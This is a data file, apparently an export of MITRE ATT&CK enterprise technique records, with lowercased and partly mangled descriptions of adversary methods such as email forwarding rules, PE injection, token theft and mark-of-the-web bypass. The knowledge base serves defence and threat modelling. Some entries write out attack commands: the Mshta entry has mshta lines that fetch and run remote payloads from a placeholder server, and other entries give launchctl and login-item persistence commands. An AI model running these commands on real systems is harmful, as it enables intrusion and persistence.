attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0,['enterprise-attack'],['T1114.003'],Email Forwarding Rule,adversaries may setup email forwarding rules to collect sensitive information  adversaries may abuse email forwarding rules to monitor the activities of a victim  steal information  and further gain intelligence on the victim or the victim s organization to use as part of further exploits or operations_ citation  us cert ta      a       furthermore  email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators_ citation  pfammatter   hidden inbox rules  most email clients allow users to create inbox rules for various email functions  including forwarding to a different recipient  these rules may be created through a local email application  a web interface  or by command line interface  messages can be forwarded to internal or external recipients  and there are no restrictions limiting the extent of this rule  administrators may also create forwarding rules for user accounts with the same considerations and outcomes_ citation  microsoft tim mcmichael exchange mail forwarding    citation  mac forwarding rules   any user or administrator within the organization  or adversary with valid credentials  can create rules to automatically forward all received messages to another recipient  forward emails to different locations based on the sender  and more  adversaries may also hide the rule by making use of the microsoft messaging api  mapi  to modify the rule properties  making it hidden and not visible from outlook  owa or most exchange administration tools_ citation  pfammatter   hidden inbox rules 
attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e,['enterprise-attack'],['T1074'],Data Staged,adversaries may stage collected data in a central location or directory prior to exfiltration  data may be kept in separate files or combined into one file through techniques such as  archive collected  interactive command shells may be used  and common functionality within  and bash may be used to copy data into a staging location_ citation  pwc cloud hopper april        in cloud environments  adversaries may stage data within a particular instance or virtual machine before exfiltration  an adversary may  create cloud  and stage data in that instance_ citation  mandiant m trends        adversaries may choose to stage data from a victim network in a centralized location prior to exfiltration to minimize the number of connections made to their c  server and better evade detection 
attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331,['enterprise-attack'],['T1649'],Steal or Forge Authentication Certificates,adversaries may steal or forge certificates used for authentication to access remote systems or resources  digital certificates are often used to sign and encrypt messages and or files  certificates are also used as authentication material  for example  azure ad device certificates and active directory certificate services  ad cs  certificates bind to an identity and can be used as credentials for domain accounts_ citation  o    blog azure ad device ids  citation  microsoft ad cs overview   authentication certificates can be both stolen and forged  for example  ad cs certificates can be stolen from encrypted storage  in the registry or files   misplaced certificate files  i_e   unsecured  or directly from the windows certificate store via various crypto apis_ citation  specterops certified pre owned  citation  github certstealer  citation  github ghostpack certificates  with appropriate enrollment rights  users and or machines within a domain can also request and or manually renew certificates from enterprise certificate authorities  ca   this enrollment process defines various settings and permissions associated with the certificate  of note  the certificate s extended key usage  eku  values define signing  encryption  and authentication use cases  while the certificate s subject alternative name  san  values define the certificate owner s alternate names_ citation  medium certified pre owned   abusing certificates for authentication credentials may enable other behaviors such as  lateral  certificate related misconfigurations may also enable opportunities for  privilege  by way of allowing users to impersonate or assume privileged accounts or permissions via the identities  sans  associated with a certificate  these abuses may also enable  via stealing or forging certificates that can be used as  valid  for the duration of the certificate's validity  despite user password resets  authentication certificates can also be stolen and forged for machine accounts_  adversaries who have access to root  or subordinate  ca certificate private keys  or mechanisms protecting managing these keys  may also establish  by forging arbitrary authentication certificates for the victim domain  known as  golden  certificates _ citation  medium certified pre owned  adversaries may also target certificates and related services in order to access other forms of credentials  such as  golden  ticket granting tickets  tgt  or ntlm plaintext_ citation  medium certified pre owned 
attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215,['enterprise-attack'],['T1098.005'],Device Registration,adversaries may register a device to an adversary controlled account  devices may be registered in a multifactor authentication  mfa  system  which handles authentication to the network  or in a device management system  which handles device access and compliance_  mfa systems  such as duo or okta  allow users to associate devices with their accounts in order to complete mfa requirements  an adversary that compromises a user s credentials may enroll a new device in order to bypass initial mfa requirements and gain persistent access to a network_ citation  cisa mfa printnightmare  citation  darkreading fireeye solarwinds   similarly  an adversary with existing access to a network may register a device to azure ad and or its device management system  microsoft intune  in order to access sensitive data or resources while bypassing conditional access policies_ citation  aadinternals   device registration  citation  aadinternals   conditional access bypass  citation  microsoft dev         devices registered in azure ad may be able to conduct  internal  campaigns via intra organizational emails  which are less likely to be treated as suspicious by the email client_ citation  microsoft   device registration  additionally  an adversary may be able to perform a  service exhaustion  on an azure ad tenant by registering a large number of devices_ citation  aadinternals   bprt 
attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475,['enterprise-attack'],['T1049'],System Network Connections Discovery,adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network    an adversary who gains access to a system that is part of a cloud based environment may map out virtual private clouds or virtual networks in order to determine what systems and services are connected  the actions performed are likely the same types of discovery techniques depending on the operating system  but the resulting information may include details about the networked cloud environment relevant to the adversary's goals  cloud providers may have different ways in which their virtual networks operate_ citation  amazon aws vpc guide  citation  microsoft azure virtual network overview  citation  google vpc overview  similarly  adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services_  utilities and commands that acquire this information include   net use   and  net session  with  in mac and linux   and lsof can be used to list current connections  who  a and w can be used to show which users are currently logged in  similar to  net session   additionally  built in features native to network devices and  network device  may be used  e_g  show ip sockets  show tcp brief  
attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9,['enterprise-attack'],['T1584'],Compromise Infrastructure,adversaries may compromise third party infrastructure that can be used during targeting  infrastructure solutions include physical or cloud servers  domains  and third party web and dns services  instead of buying  leasing  or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle_ citation  mandiant apt   citation  talos dnspionage nov       citation  fireeye eps awakens part    additionally  adversaries may compromise numerous machines to form a botnet they can leverage_  use of compromised infrastructure allows an adversary to stage  launch  and execute an operation  compromised infrastructure can help adversary operations blend in with traffic that is seen as normal  such as contact with high reputation or trusted sites  for example  adversaries may leverage compromised infrastructure  potentially also in conjunction with  digital  to further blend in and support staged information gathering and or  campaigns_ citation  fireeye dns hijack         by using compromised infrastructure  adversaries may make it difficult to tie their actions back to them  prior to targeting  adversaries may compromise the infrastructure of other adversaries_ citation  nsa ncsc turla oilrig 
attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961,['enterprise-attack'],['T1553.005'],Mark-of-the-Web Bypass,adversaries may abuse specific file formats to subvert mark of the web  motw  controls  in windows  when files are downloaded from the internet  they are tagged with a hidden ntfs alternate data stream  ads  named zone_identifier with a specific value known as the motw_ citation  microsoft zone_identifier       files that are tagged with motw are protected and cannot perform certain actions  for example  starting in ms office     if a ms office file has the motw  it will open in protected view  executables tagged with the motw will be processed by windows defender smartscreen that compares files with an allowlist of well known executables  if the file in not known trusted  smartscreen will prevent the execution and warn the user not to run it_ citation  beek use of vhd dec       citation  outflank motw       citation  intezer russian apt dec        adversaries may abuse container files such as compressed archive  _arj  _gzip  and or disk image  _iso  _vhd  file formats to deliver malicious payloads that may not be tagged with motw  container files downloaded from the internet will be marked with motw but the files within may not inherit the motw after the container files are extracted and or mounted  motw is a ntfs feature and many container files do not support ntfs alternative data streams  after a container file is extracted and or mounted  the files contained within them may be treated as local files on disk and run without protections_ citation  beek use of vhd dec       citation  outflank motw      
attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5,['enterprise-attack'],['T1600.002'],Disable Crypto Hardware,adversaries disable a network device s dedicated hardware encryption  which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting  manipulating  and exfiltrating transmitted data_  many network devices such as routers  switches  and firewalls  perform encryption on network traffic to secure transmission across networks  often  these devices are equipped with special  dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering  when an adversary takes control of such a device  they may disable the dedicated hardware  for example  through use of  modify system  forcing the use of software to perform encryption on general processors  this is typically used in conjunction with attacks to weaken the strength of the cipher in software  e_g_   reduce key   citation  cisco blog legacy device attacks 
attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e,['enterprise-attack'],['T1542'],Pre-OS Boot,adversaries may abuse pre os boot mechanisms as a way to establish persistence on a system  during the booting process of a computer  firmware and various startup services are loaded before the operating system  these programs control flow of execution before the operating system takes control_ citation  wikipedia booting   adversaries may overwrite data in boot drivers or firmware such as bios  basic input output system  and the unified extensible firmware interface  uefi  to persist on systems at a layer below the operating system  this can be particularly difficult to detect as malware at this level will not be detected by host software based defenses 
attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44,['enterprise-attack'],['T1064'],Scripting,  this technique has been deprecated  please use  command and scripting  where appropriate_    adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual  scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources  some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an api level instead of calling other programs  common scripting languages for windows include vbscript and  but could also be in the form of command line batch scripts_  scripts can be embedded inside office documents as macros that can be set to execute when files used in  spearphishing  and other types of spearphishing are opened  malicious embedded macros are an alternative means of execution than software exploitation through  exploitation for client  where adversaries will rely on macros being allowed or that the user will accept to activate them_  many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike  metasploit   veil   and powersploit  are three examples that are popular among penetration testers for exploit and post compromise operations and include many features for evading defenses  some adversaries are known to use powershell   citation  alperovitch      
attack-pattern--800f9819-7007-4540-a520-40e655876800,['enterprise-attack'],['T1612'],Build Image on Host,adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry  a remote build request may be sent to the docker api that includes a dockerfile that pulls a vanilla base image  such as alpine  from a public or local registry and then builds a custom image upon it_ citation  docker build image   an adversary may take advantage of that build api to build a custom image on the host that includes malware downloaded from their c  server  and then they then may utilize  deploy  using that custom image_ citation  aqua build images on hosts  citation  aqua security cloud native threat report june       if the base image is pulled from a public registry  defenses will likely not detect the image as malicious since it s a vanilla image  if the base image already resides in a local registry  the pull may be considered even less suspicious since the image is already in the environment 
attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db,['enterprise-attack'],['T1051'],Shared Webroot,  this technique has been deprecated and should no longer be used_    adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or web content directory  citation  microsoft web root oct        citation  apache server       and then browse to that content with a web browser to cause the server to execute the malicious content  the malicious content will typically run under the context and permissions of the web server process  often resulting in local system or administrative privileges  depending on how the web server is configured_  this mechanism of shared access and remote execution could be used for lateral movement to the system running the web server  for example  a web server running php with an open network share could allow an adversary to upload a remote access tool and php script to execute the rat on the system running the web server when a specific page is visited   citation  webroot php      
attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662,['enterprise-attack'],['T1055.002'],Portable Executable Injection,adversaries may inject portable executables  pe  into processes in order to evade process based defenses as well as possibly elevate privileges  pe injection is a method of executing arbitrary code in the address space of a separate live process    pe injection is commonly performed by copying code  perhaps without a file on disk  into the virtual address space of the target process before invoking it via a new thread  the write can be performed with native windows api calls such as virtualallocex and writeprocessmemory  then invoked with createremotethread or additional code  ex  shellcode   the displacement of the injected code does introduce the additional requirement for functionality to remap memory references   citation  elastic process injection july         running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via pe injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--808e6329-ca91-4b87-ac2d-8eadc5f8f327,['enterprise-attack'],['T1218.012'],Verclsid,adversaries may abuse verclsid_exe to proxy execution of malicious code  verclsid_exe is known as the extension clsid verification host and is responsible for verifying each shell extension before they are used by windows explorer or the windows shell_ citation  winosbite verclsid_exe   adversaries may abuse verclsid_exe to execute malicious payloads  this may be achieved by running verclsid_exe  s  c  clsid   where the file is referenced by a class id  clsid   a unique identification number used to identify com objects  com payloads executed by verclsid_exe may be able to perform various malicious actions  such as loading and executing com scriptlets  sct  from remote servers  similar to  since the binary may be signed and or native on windows systems  proxying execution via verclsid_exe may bypass application control solutions that do not account for its potential abuse_ citation  lolbas verclsid  citation  red canary verclsid_exe  citation  bohops abusing the com registry  citation  nick tyrer github 
attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a,['enterprise-attack'],['T1586'],Compromise Accounts,adversaries may compromise accounts with services that can be used during targeting  for operations incorporating social engineering  the utilization of an online persona may be important  rather than creating and cultivating accounts  i_e   establish  adversaries may compromise existing accounts  utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship  or knowledge of  the compromised persona    a variety of methods exist for compromising accounts  such as gathering credentials via  phishing for  purchasing credentials from third party sites  or by brute forcing credentials  ex  password reuse from breach credential dumps   prior to compromising accounts  adversaries may conduct reconnaissance to inform decisions about which accounts to compromise to further their operation_  personas may exist on a single site or across multiple sites  ex  facebook  linkedin  twitter  google  etc_   compromised accounts may require additional development  this could include filling out or modifying profile information  further developing social networks  or incorporating photos_  adversaries may directly leverage compromised email accounts for  phishing for  or
attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d,['enterprise-attack'],['T1569.001'],Launchctl,adversaries may abuse launchctl to execute commands or programs  launchctl interfaces with launchd  the service management framework for macos  launchctl supports taking subcommands on the command line  interactively  or even redirected from standard input_ citation  launchctl man   adversaries use launchctl to execute commands and programs as  launch  or  launch  common subcommands include  launchctl load launchctl unload  and launchctl start  adversaries can use scripts or manually run the commands launchctl load  w   s library launchagents  s  or  bin launchctl load to execute  launch  or  launch  sofacy komplex trojan  citation     macos common tools and techniques 
attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3,['enterprise-attack'],['T1584.005'],Botnet,adversaries may compromise numerous third party systems to form a botnet that can be used during targeting  a botnet is a network of compromised systems that can be instructed to perform coordinated tasks_ citation  norton botnet  instead of purchasing renting a botnet from a booter stresser service  adversaries may build their own botnet by compromising numerous third party systems_ citation  imperva ddos for hire  adversaries may also conduct a takeover of an existing botnet  such as redirecting bots to adversary controlled c  servers_ citation  dell dridex oct       with a botnet at their disposal  adversaries may perform follow on activity such as large scale  or distributed denial of service  ddos  
attack-pattern--818302b2-d640-477b-bf88-873120ce85c4,['enterprise-attack'],['T1059.008'],Network Device CLI,adversaries may abuse scripting or built in command line interpreters  cli  on network devices to execute malicious command and payloads  the cli is the primary means through which users and administrators interact with the device in order to view system information  modify device operations  or perform diagnostic and administrative functions  clis typically contain various permission levels required for different commands    scripting interpreters automate tasks and extend functionality beyond the command set included in the network os  the cli and scripting interpreter are accessible through a direct console connection  or through remote means  such as telnet or   adversaries can use the network cli to change how network devices behave and operate  the cli may be used to manipulate traffic flows to intercept or manipulate data  modify startup configuration parameters to load malicious system software  or to disable security features or logging to avoid detection_ citation  cisco synful knock evolution 
attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3,['enterprise-attack'],['T1552.003'],Bash History,adversaries may search the bash command history on compromised systems for insecurely stored credentials  bash keeps track of the commands users type on the command line with the  history  utility  once a user logs out  the history is flushed to the user s _bash_history file  for each user  this file resides at the same location    _bash_history  typically  this file keeps track of the user s last     commands  users often type usernames and passwords on the command line as parameters to programs  which then get saved to this file when they log out  adversaries can abuse this by looking through the file for potential credentials   citation  external to da  the os x way 
attack-pattern--824add00-99a1-4b15-9a2d-6c5683b7b497,['enterprise-attack'],['T1562.010'],Downgrade Attack,adversaries may downgrade or use a version of system features that may be outdated  vulnerable  and or does not support updated security controls such as logging  for example   versions    includes script block logging  sbl  which can record executed script content  however  adversaries may attempt to execute a previous version of powershell that does not support sbl with the intent to  impair  while running malicious scripts that may have otherwise been detected_ citation  crowdstrike bgh ransomware       citation  mandiant byol        adversaries may downgrade and use less secure versions of various features of a system  such as  command and scripting  or even network protocols that can be abused to enable  praetorian tls downgrade attack      
attack-pattern--8252f135-ed26-4ce1-ae61-f26e94429a19,['enterprise-attack'],['T1559.003'],XPC Services,adversaries can provide malicious content to an xpc service daemon for local code execution  macos uses xpc services for basic inter process communication between various processes  such as between the xpc service daemon and third party application privileged helper tools  applications can send messages to the xpc service daemon  which runs as root  using the low level xpc service c api or the high level nsxpcconnection api in order to handle tasks that require elevated privileges  such as network connections   applications are responsible for providing the protocol definition which serves as a blueprint of the xpc services  developers typically use xpc services to provide applications stability and privilege separation between the application client and the daemon_ citation  designing daemons apple dev   adversaries can abuse xpc services to execute malicious content  requests for malicious execution can be passed through the application's xpc services handler_ citation  cvmserver vuln  citation  learn xpc exploitation  this may also include identifying and abusing improper xpc client validation and or poor sanitization of input parameters to conduct  exploitation for privilege
attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d,['enterprise-attack'],['T1497'],Virtualization/Sandbox Evasion,adversaries may employ various means to detect and avoid virtualization and analysis environments  this may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment  vme  or sandbox  if the adversary detects a vme  they may alter their malware to disengage from the victim or conceal the core functions of the implant  they may also search for vme artifacts before dropping secondary or additional payloads  adversaries may use the information learned from  virtualization sandbox  during automated discovery to shape follow on behaviors_ citation  deloitte environment awareness   adversaries may use several methods to accomplish  virtualization sandbox  such as checking for security monitoring tools  e_g_  sysinternals  wireshark  etc_  or other system artifacts associated with analysis or virtualization  adversaries may also check for legitimate user activity to help determine if it is in an analysis environment  additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox_ citation  unit    pirpi july      
attack-pattern--830c9528-df21-472c-8c14-a036bf17d665,['enterprise-attack'],['T1102'],Web Service,adversaries may use an existing  legitimate external web service as a means for relaying data to from a compromised system  popular websites and social media acting as a mechanism for c  may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise  using common services  such as those offered by google or twitter  makes it easier for adversaries to hide in expected noise  web service providers commonly use ssl tls encryption  giving adversaries an added level of protection_  use of web services may also protect back end c  infrastructure from discovery through malware binary analysis while also enabling operational resiliency  since this infrastructure may be dynamically changed  
attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc,['enterprise-attack'],['T1552.001'],Credentials In Files,adversaries may search local file systems and remote file shares for files containing insecurely stored credentials  these can be files created by users to store their own credentials  shared credential stores for a group of individuals  configuration files containing passwords for a system or service  or source code binary files containing embedded passwords_  it is possible to extract passwords from backups or saved virtual machines through  os credential   citation  cg       passwords may also be obtained from group policy preferences stored on the windows domain controller   citation  srd gpp   in cloud and or containerized environments  authenticated user and service account credentials are often stored in local configuration and credential files_ citation  unit    hildegard malware  they may also be found as parameters to deployment commands in container logs_ citation  unit    unsecured docker daemons  in some cases  these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files_ citation  specter ops   cloud credential storage 
attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1,['enterprise-attack'],['T1568.003'],DNS Calculation,adversaries may perform calculations on addresses returned in dns results to determine which port and ip address to use for command and control  rather than relying on a predetermined port number or the actual returned ip address  a ip and or port number calculation can be used to bypass egress filtering on a c  channel_ citation  meyers numbered panda   one implementation of  dns  is to take the first three octets of an ip address in a dns response and use those values to calculate the port for command and control traffic_ citation  meyers numbered panda  citation  moran      
attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade,['enterprise-attack'],['T1218.005'],Mshta,adversaries may abuse mshta_exe to proxy execution of malicious _hta files and javascript or vbscript through a trusted windows utility  there are several examples of different types of threats leveraging mshta_exe during initial compromise and for execution of code  citation  cylance dust storm   citation  red canary hta abuse part deux   citation  fireeye attacks leveraging hta   citation  airbus security kovter analysis   citation  fireeye fin  april         mshta_exe is a utility that executes microsoft html applications  hta  files   citation  wikipedia html application  htas are standalone applications that execute using the same models and technologies of internet explorer  but outside of the browser   citation  msdn html applications   files may be executed by mshta_exe through an inline script  mshta vbscript close execute  getobject   script https     webserver payload _ sct        they may also be executed directly from urls  mshta http     webserver payload _ hta  mshta_exe can be used to bypass application control solutions that do not account for its potential use  since mshta_exe executes outside of the internet explorer's security context  it also bypasses browser security settings   citation  lolbas mshta 
attack-pattern--84601337-6a55-4ad7-9c35-79e0d1ea2ab3,['enterprise-attack'],['T1547.015'],Login Items,adversaries may add login items to execute upon user login to gain persistence or escalate privileges  login items are applications  documents  folders  or server connections that are automatically launched when a user logs in_ citation  open login items apple  login items can be added via a shared file list or service management framework_ citation  adding login items  shared file list login items can be set using scripting languages such as  whereas the service management framework uses the api call smloginitemsetenabled_  login items installed using the service management framework leverage launchd  are not visible in the system preferences  and can only be removed by the application that created them_ citation  adding login items  citation  smloginitemsetenabled schroeder       login items created using a shared file list are visible in system preferences  can hide the application when it launches  and are executed through launchservices  not launchd  to open applications  documents  or urls without using finder_ citation  launch services apple developer  users and applications use login items to configure their user environment to launch commonly used services or applications  such as email  chat  and music applications_  adversaries can utilize  and  native  calls to create a login item to spawn malicious executables_ citation  elc running at startup  prior to version   _  on macos  adversaries can add login items by using  to send an apple events to the  system events  process  which has an applescript dictionary for manipulating login items_ citation  login items ae  adversaries can use a command such as tell application  system events  to make login item at end with properties  path to executable_ citation  startup items eclectic  citation  hexed osx_dok analysis       citation  add list remove login items apple script  this command adds the path of the malicious executable to the login item file list located in   library application support com_apple_backgroundtaskmanagementagent backgrounditems_btm_ citation  startup items eclectic  adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials_ citation  objsee mac malware       citation  checkpoint dok  citation  objsee netwire backdoor      
attack-pattern--84771bc3-f6a0-403e-b144-01af70e5fda0,['enterprise-attack'],['T1608'],Stage Capabilities,adversaries may upload  install  or otherwise set up capabilities that can be used during targeting  to support their operations  an adversary may need to take capabilities they developed   develop  or obtained   obtain  and stage them on infrastructure under their control  these capabilities may be staged on infrastructure that was previously purchased rented by the adversary   acquire  or was otherwise compromised by them   compromise  capabilities may also be staged on web services  such as github or pastebin  or on platform as a service  paas  offerings that enable users to easily provision applications_ citation  volexity ocean lotus november       citation  dragos heroku watering hole  citation  malwarebytes heroku skimmers  citation  netskope gcp redirection  citation  netskope cloud phishing   staging of capabilities can aid the adversary in a number of initial access and post compromise behaviors  including  but not limited to      staging web resources necessary to conduct  drive by  when a user browses to a site_ citation  fireeye cfr watering hole       citation  gallagher       citation  att scanbox    staging web resources for a link target to be used with spearphishing_ citation  malwarebytes silent librarian october       citation  proofpoint ta    september         uploading malware or tools to a location accessible to a victim network to enable  ingress tool  volexity ocean lotus november         installing a previously acquired ssl tls certificate to use to encrypt command and control traffic  ex   asymmetric  with  web  digicert install ssl cert 
attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701,['enterprise-attack'],['T1608.005'],Link Target,adversaries may put in place resources that are referenced by a link that can be used during targeting  an adversary may rely upon a user clicking a malicious link in order to divulge information  including credentials  or to gain execution  as in  malicious  links can be used for spearphishing  such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a url into a browser  prior to a phish for information  as in  spearphishing  or a phish to gain initial access to a system  as in  spearphishing  an adversary must set up the resources for a link target for the spearphishing link    typically  the resources for a link target will be an html page that may include some client side script such as  to decide what content to serve to the user  adversaries may clone legitimate sites to serve as the link target  this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during  spearphishing  malwarebytes silent librarian october       citation  proofpoint ta    september       adversaries may also  upload  and have the link target point to malware for download execution by the user_  adversaries may purchase domains similar to legitimate domains  ex  homoglyphs  typosquatting  different top level domain  etc_  during acquisition of infrastructure  to help facilitate  malicious  link shortening services can also be employed  adversaries may also use free or paid accounts on platform as a service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked_ citation  netskope gcp redirection  citation  netskope cloud phishing  citation  intezer app service phishing 
attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91,['enterprise-attack'],['T1104'],Multi-Stage Channels,adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions  use of multiple stages may obfuscate the command and control channel to make detection more difficult_  remote access tools will call back to the first stage command and control server for instructions  the first stage may have automated capabilities to collect basic host information  update tools  and upload additional files  a second remote access tool  rat  could be uploaded at that point to redirect the host to the second stage command and control server  the second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional rat features_  the different stages will likely be hosted separately with no overlapping infrastructure  the loader may also have backup first stage callbacks or  fallback  in case the original first stage communication path is discovered and blocked 
attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852,['enterprise-attack'],['T1480'],Execution Guardrails,adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target  guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary s campaign_ citation  fireeye kevin mandia guardrails  values an adversary can provide about a target system or environment to use as guardrails may include specific network share names  attached physical devices  files  joined active directory  ad  domains  and local external ip addresses_ citation  fireeye outlook dec        guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within  this use of guardrails is distinct from typical  virtualization sandbox  while use of  virtualization sandbox  may involve checking for known sandbox values and continuing with execution only if there is no match  the use of guardrails will involve checking for an expected target specific value and only continuing with execution if there is such a match 
attack-pattern--8565825b-21c8-4518-b75e-cbc4c717a156,['enterprise-attack'],['T1619'],Cloud Storage Object Discovery,adversaries may enumerate objects in cloud storage infrastructure  adversaries may use this information during automated discovery to shape follow on behaviors  including requesting all or specific objects from cloud storage   similar to  file and directory  on a local host  after identifying available storage services  i_e   cloud infrastructure  adversaries may access the contents objects stored in cloud infrastructure_  cloud service providers offer apis allowing users to enumerate objects stored within cloud storage  examples include listobjectsv  in aws  and list blobs in azure citation  list blobs   
attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a,['enterprise-attack'],['T1606.001'],Web Cookies,adversaries may forge web cookies that can be used to gain access to web applications or internet services  web applications and services  hosted in cloud saas environments or on premise servers  often use session cookies to authenticate and authorize user access_  adversaries may generate these cookies in order to gain access to web resources  this differs from  steal web session  and other similar behaviors in that the cookies are new and forged by the adversary  rather than stolen or intercepted from legitimate users  most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces_ citation  pass the cookie  the generation of web cookies often requires secret values  such as passwords   private  or other cryptographic seed values_  once forged  adversaries may use these web cookies to access resources   web session  which may bypass multi factor and other authentication protection mechanisms_ citation  volexity solarwinds  citation  pass the cookie  citation  unit    mac crypto cookies january      
attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d,['enterprise-attack'],['T1134.001'],Token Impersonation/Theft,adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls  an adversary can create a new access token that duplicates an existing token using duplicatetoken ex   the token can then be used with impersonateloggedonuser to allow the calling thread to impersonate a logged on user's security context  or with setthreadtoken to assign the impersonated token to a thread_  an adversary may do this when they have a specific  existing process they want to assign the new token to  for example  this may be useful for when the target user has a non network logon session on the system 
attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7,['enterprise-attack'],['T1567.001'],Exfiltration to Code Repository,adversaries may exfiltrate data to a code repository rather than over their primary command and control channel  code repositories are often accessible via an api  ex  https   api_github_com   access to these apis are often over https  which gives the adversary an additional level of protection_  exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network 
attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd,['enterprise-attack'],['T1205.001'],Port Knocking,adversaries may use port knocking to hide open ports used for persistence or command and control  to enable a port  an adversary sends a series of attempted connections to a predefined sequence of closed ports  after the sequence is completed  opening a port is often accomplished by the host based firewall  but could also be implemented by custom software_  this technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system_  the observation of the signal packets to trigger the communication can be conducted through different methods  one means  originally implemented by cd  r  citation  hartrell cd  r        is to use the libpcap libraries to sniff for the packets in question  another method leverages raw sockets  which enables the malware to use ports that are already open for use by other programs 
attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54,['enterprise-attack'],['T1583.006'],Web Services,adversaries may register for web services that can be used during targeting  a variety of popular websites exist for adversaries to register for a web based service that can be abused during later stages of the adversary lifecycle  such as during command and control   web  or  exfiltration over web  using common services  such as those offered by google or twitter  makes it easier for adversaries to hide in expected noise  by utilizing a web service  adversaries can make it difficult to physically tie back operations to them 
attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a,['enterprise-attack'],['T1528'],Steal Application Access Token,adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources_  application access tokens are used to make authorized api requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container based applications and software as a service  saas _ citation  auth    why you should always use access tokens to secure apis sept       oauth is one commonly implemented framework that issues tokens to users for access to systems  adversaries who steal account api tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts  which can lead to privilege escalation and further compromise of the environment_  in kubernetes environments  processes running inside a container communicate with the kubernetes api server using service account tokens  if a container is compromised  an attacker may be able to steal the container s token and thereby gain access to kubernetes api commands_ citation  kubernetes service accounts   token theft can also occur through social engineering  in which case user action may be required to grant access  an application desiring access to cloud based services or protected apis can gain entry using oauth  _  through a variety of authorization protocols  an example commonly used sequence is microsoft's authorization code grant flow_ citation  microsoft identity platform protocols may       citation  microsoft   oauth code authorization flow   june       an oauth access token enables a third party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials     adversaries can leverage oauth authorization by constructing a malicious application designed to be granted access to resources with the target user's oauth token_ citation  amnesty oauth phishing attacks  august       citation  trend micro pawn storm oauth       the adversary will need to complete registration of their application with the authorization server  for example microsoft identity platform using azure portal  the visual studio ide  the command line interface  powershell  or rest api calls_ citation  microsoft   azure ad app registration   may       then  they can send a  spearphishing  to the target user to entice them to grant access to the application  once the oauth access token is granted  the application can gain potentially long term access to features of the user account through  application access  microsoft   azure ad identity tokens   aug        application access tokens may function within a limited lifetime  limiting how long an adversary can utilize the stolen token  however  in some cases  adversaries can also steal application refresh tokens citation  auth  understanding refresh tokens   allowing them to obtain new access tokens without prompting the user 
